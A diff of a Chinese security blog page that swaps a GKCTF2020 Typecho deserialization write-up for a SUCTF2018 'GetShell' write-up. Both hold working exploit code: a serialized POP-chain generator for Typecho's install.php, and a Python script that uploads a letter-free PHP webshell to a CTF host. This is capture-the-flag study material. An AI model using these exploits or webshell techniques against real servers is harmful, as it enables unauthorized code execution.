@@ -20,18 +20,18 @@
     var CONFIG = {"hostname":"z3ratu1.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="[GKCTF2020]EzTypecho暑假恢复刷题，顺便把以前堆积的东西也都更新到博客上，清一下桌面GKCTF这次题感觉好多都是现有CVE之类的东西，然后加一点点题目是一个typecho的安装流程，但是安装到一半就不给安装了，想了半天不知道他想让我怎样才能安装，后来才知道是typecho在安装时install.php有一个反序列化的任意代码执行。最后题目还要求反序列化需要一个session，需要">
-<meta name="keywords" content="wp,session,typecho">
+  <meta name="description" content="[SUCTF2018]GetShellSUCTF的老题了，无字母数字加符号限制的命令执行 点upload之后会有一个act=upload，一开始以为有文件包含之类的，加目录伪协议试了半天，没太懂怎么回事，感觉是拼接了目录之后又限制了目录穿越，没有文件包含的机会了 题解if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;])){">
+<meta name="keywords" content="RCE">
 <meta property="og:type" content="article">
-<meta property="og:title" content="GKCTF2020 EzTypecho">
-<meta property="og:url" content="http:&#x2F;&#x2F;z3ratu1.github.io&#x2F;2020&#x2F;07&#x2F;10&#x2F;%5BGKCTF2020%5DEzTypecho&#x2F;index.html">
+<meta property="og:title" content="[SUCTF2018]GetShell">
+<meta property="og:url" content="http:&#x2F;&#x2F;z3ratu1.github.io&#x2F;2020&#x2F;08&#x2F;31&#x2F;%5BSUCTF2018%5DGetShell&#x2F;index.html">
 <meta property="og:site_name" content="Z3ratu1&#39;s blog">
-<meta property="og:description" content="[GKCTF2020]EzTypecho暑假恢复刷题，顺便把以前堆积的东西也都更新到博客上，清一下桌面GKCTF这次题感觉好多都是现有CVE之类的东西，然后加一点点题目是一个typecho的安装流程，但是安装到一半就不给安装了，想了半天不知道他想让我怎样才能安装，后来才知道是typecho在安装时install.php有一个反序列化的任意代码执行。最后题目还要求反序列化需要一个session，需要">
+<meta property="og:description" content="[SUCTF2018]GetShellSUCTF的老题了，无字母数字加符号限制的命令执行 点upload之后会有一个act=upload，一开始以为有文件包含之类的，加目录伪协议试了半天，没太懂怎么回事，感觉是拼接了目录之后又限制了目录穿越，没有文件包含的机会了 题解if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;])){">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-07-12T08:33:48.502Z">
+<meta property="og:updated_time" content="2020-08-31T13:54:03.745Z">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://z3ratu1.github.io/2020/07/10/%5BGKCTF2020%5DEzTypecho/">
+<link rel="canonical" href="http://z3ratu1.github.io/2020/08/31/%5BSUCTF2018%5DGetShell/">
 
 
 <script id="page-configurations">
@@ -44,7 +44,7 @@
   };
 </script>
 
-  <title>GKCTF2020 EzTypecho | Z3ratu1's blog</title>
+  <title>[SUCTF2018]GetShell | Z3ratu1's blog</title>
   
 
 
@@ -200,7 +200,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="http://z3ratu1.github.io/2020/07/10/%5BGKCTF2020%5DEzTypecho/">
+    <link itemprop="mainEntityOfPage" href="http://z3ratu1.github.io/2020/08/31/%5BSUCTF2018%5DGetShell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="http://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
@@ -213,7 +213,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          GKCTF2020 EzTypecho
+          [SUCTF2018]GetShell
         </h1>
 
         <div class="post-meta">
@@ -222,16 +222,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-07-10 10:20:00" itemprop="dateCreated datePublished" datetime="2020-07-10T10:20:00+08:00">2020-07-10</time>
+              <time title="创建时间：2020-08-31 21:52:17 / 修改时间：21:54:03" itemprop="dateCreated datePublished" datetime="2020-08-31T21:52:17+08:00">2020-08-31</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-12 16:33:48" itemprop="dateModified" datetime="2020-07-12T16:33:48+08:00">2020-07-12</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -243,7 +237,7 @@
             </span>
 
           
-            <span id="/2020/07/10/%5BGKCTF2020%5DEzTypecho/" class="post-meta-item leancloud_visitors" data-flag-title="GKCTF2020 EzTypecho" title="阅读次数">
+            <span id="/2020/08/31/%5BSUCTF2018%5DGetShell/" class="post-meta-item leancloud_visitors" data-flag-title="[SUCTF2018]GetShell" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -258,8 +252,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2020/07/10/%5BGKCTF2020%5DEzTypecho/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/07/10/%5BGKCTF2020%5DEzTypecho/" itemprop="commentCount"></span>
+    <a title="valine" href="/2020/08/31/%5BSUCTF2018%5DGetShell/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/31/%5BSUCTF2018%5DGetShell/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -274,55 +268,43 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="GKCTF2020-EzTypecho"><a href="#GKCTF2020-EzTypecho" class="headerlink" title="[GKCTF2020]EzTypecho"></a>[GKCTF2020]EzTypecho</h1><p>暑假恢复刷题，顺便把以前堆积的东西也都更新到博客上，清一下桌面<br>GKCTF这次题感觉好多都是现有CVE之类的东西，然后加一点点<br>题目是一个typecho的安装流程，但是安装到一半就不给安装了，想了半天不知道他想让我怎样才能安装，后来才知道是typecho在安装时install.php有一个反序列化的任意代码执行。<br>最后题目还要求反序列化需要一个session，需要自己想办法建立一个session</p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>typecho反序列化的pop链网上都有分析了，抄一个脚本执行任意命令<br><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/155753.html</a></p>
+        <h1 id="SUCTF2018-GetShell"><a href="#SUCTF2018-GetShell" class="headerlink" title="[SUCTF2018]GetShell"></a>[SUCTF2018]GetShell</h1><p>SUCTF的老题了，无字母数字加符号限制的命令执行</p>
+<p>点upload之后会有一个act=upload，一开始以为有文件包含之类的，加目录伪协议试了半天，没太懂怎么回事，感觉是拼接了目录之后又限制了目录穿越，没有文件包含的机会了</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_char</span> <span class="token keyword">as</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"illegal char"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>     
+<span class="token punctuation">}</span> </code></pre>
+<p>blacklist没给，自己fuzz一下，字母数字全禁，符号也就如下这几个能用<code>.[]=~$()_;</code>，测了一下ascii大于128的字符，都能用，而源码只有前五个字符不受限制，空格换行符也没有，上传上去的文件名不可控，但是会给一个php后缀，所以文件开头肯定是短标签&lt;?=，这一点很好确定</p>
+<p>给了取反符号，自然就是通过取反拼接字符串了，直接用<code>echo urlencode(~&#39;p&#39;)</code>这样子获取取反后的ascii码，然后再取反回来就可以了（大概<br>实际使用的时候发现总会在前面出现一个等于号，如下</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$CMD</span> <span class="token operator">=</span> <span class="token string">'system("cat /flag")'</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 0x8c对应的字符</span>
+<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># =s</span></code></pre>
+<p>所以还得取这个字符串的第二位<br>变量名可以直接叫$_，这样子很方便，然后通过弱类型转换，令$_=[];$_=$_==$_，得到$_=true，再弱类型变成1，作为数组下标，就可以获得对应的字母了</p>
+<p>可以通过动态调用的形式来执行命令，比如令$__=system,$___=$_GET[a]，那么$__($___)就是system($_GET[a])<br>不过直接拼是不能拼出$_GET这种超全局变量的，需要先令$_=_GET;$__=$$_，这样子构造出来的$__就是超全局变量$_GET，再以数组形式访问$__[_]，等价于$_GET[_]</p>
+<p><del>一开始想拼一个$_=$_GET出来的，后来不知道为什么$符号怎么取反也取不到，最后发现根本不需要美元符号。。。</del></p>
+<p>最后写了个垃圾脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
 
-<span class="token keyword">class</span> <span class="token class-name">Typecho_Feed</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">const</span> <span class="token constant">RSS2</span> <span class="token operator">=</span> <span class="token string">'RSS 2.0'</span><span class="token punctuation">;</span>
-    <span class="token keyword">const</span> <span class="token constant">ATOM1</span> <span class="token operator">=</span> <span class="token string">'ATOM 1.0'</span><span class="token punctuation">;</span>
+url <span class="token operator">=</span> <span class="token string">"http://1a329468-4bf5-439b-b029-2a7dbfc3d37a.node3.buuoj.cn/index.php?act=upload"</span>
 
-    <span class="token keyword">private</span> <span class="token variable">$_type</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$_items</span><span class="token punctuation">;</span>
+char_set <span class="token operator">=</span> <span class="token string">"\n ^,|./'[]=-~`!@#$%^&amp;*()_+{}:;\"?>&lt;"</span>
 
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token comment" spellcheck="true">//$this->_type = $this::RSS2;</span>
-
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATOM1</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
-            <span class="token string">'category'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-            <span class="token string">'author'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-        <span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">class</span> <span class="token class-name">Typecho_Request</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token string">'screenName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token constant">CMD</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-
-<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
-    <span class="token string">'adapter'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-    <span class="token string">'prefix'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'typecho_'</span>
-<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p>payload添加在cookie或post数据中都可，键名为__typecho_config<br>这里有一个注意点，需要$_GET[‘start’]或$_GET[‘finish’]不为空，且Referer是本站时install.php才会进入反序列化逻辑部分。出题人似乎是在$_GET[‘finish’]这里做了过滤，需要拥有一个session才能触发反序列化，但是如果你用$_GET[‘start’]触发反序列化的话就不需要看后面的内容了</p>
-<h2 id="PHP-SESSION-UPLOAD-PROGRESS"><a href="#PHP-SESSION-UPLOAD-PROGRESS" class="headerlink" title="PHP_SESSION_UPLOAD_PROGRESS"></a>PHP_SESSION_UPLOAD_PROGRESS</h2><p>用于跟踪PHP文件上传进度的一个功能，可以通过这个功能自行创建一个session，好像在其他题目中用于条件竞争session文件反序列化来getshell，这里用这个创建一个session进行反序列化就可以了<br>先看一下PHP manual中怎么描述的</p>
-<blockquote>
-<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</p>
-</blockquote>
-<p>而session.upload_progress.name的默认值就是PHP_SESSION_UPLOAD_PROGRESS<br>因此我们在触发反序列化的时候同时手搓一个文件上传，并post一个名为PHP_SESSION_UPLOAD_PROGRESS的数据，就可以为当前会话添加一个session</p>
-<h2 id="其他东西"><a href="#其他东西" class="headerlink" title="其他东西"></a>其他东西</h2><p>session文件的文件名为sess_+PHPSESSID的值，在默认设置下允许用户自定义PHPSESSID的值，可以创建出对应的session文件，而PHP_SESSION_UPLOAD_PROGRESS的值可控，并会被写入session文件，条件竞争包含getshell</p>
+<span class="token comment" spellcheck="true"># 可用字符.[]=~$()_;</span>
+payload <span class="token operator">=</span> <span class="token string">"&lt;?=$_=[];$_=$_==$_;$___"</span> <span class="token operator">+</span> <span class="token string">"=~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x8c</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x86</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x8c</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x8b</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x9a</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0x92</span><span class="token punctuation">)</span> \
+        <span class="token operator">+</span> <span class="token string">"[$_];$__=~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0xb8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0xba</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_].~"</span> <span class="token operator">+</span> chr<span class="token punctuation">(</span><span class="token number">0xab</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"[$_];$_=$$__;$___($_[_]);"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"upload"</span><span class="token punctuation">:</span> <span class="token string">"Submit"</span><span class="token punctuation">}</span>
+files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+<p>最后执行命令的时候发现根目录下面的flag是个假flag，真flag在环境变量里面，?_=env获取flag</p>
+<p>拼超全局变量那个还是从P神博客里看的，看到这个题就想起p神提到过的这个无字母数字getshell<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
 
     </div>
 
@@ -332,9 +314,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/wp/" rel="tag"># wp</a>
-              <a href="/tags/session/" rel="tag"># session</a>
-              <a href="/tags/typecho/" rel="tag"># typecho</a>
+              <a href="/tags/RCE/" rel="tag"># RCE</a>
           </div>
 
         
@@ -343,13 +323,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/05/06/%5BHFCTF2020%5DBabyUpload/" rel="prev" title="[HFCTF2020] BabyUpload">
-      <i class="fa fa-chevron-left"></i> [HFCTF2020] BabyUpload
+    <a href="/2020/08/31/%5BGACTF2020%5D/" rel="prev" title="[GACTF2020]web">
+      <i class="fa fa-chevron-left"></i> [GACTF2020]web
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/07/10/%5BHFCTF2020%5DJustEscape/" rel="next" title="HFCTF2020 JustEscape">
-      HFCTF2020 JustEscape <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -409,7 +386,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#GKCTF2020-EzTypecho"><span class="nav-number">1.</span> <span class="nav-text">[GKCTF2020]EzTypecho</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题解"><span class="nav-number">1.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-SESSION-UPLOAD-PROGRESS"><span class="nav-number">1.2.</span> <span class="nav-text">PHP_SESSION_UPLOAD_PROGRESS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他东西"><span class="nav-number">1.3.</span> <span class="nav-text">其他东西</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF2018-GetShell"><span class="nav-number">1.</span> <span class="nav-text">[SUCTF2018]GetShell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题解"><span class="nav-number">1.1.</span> <span class="nav-text">题解</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
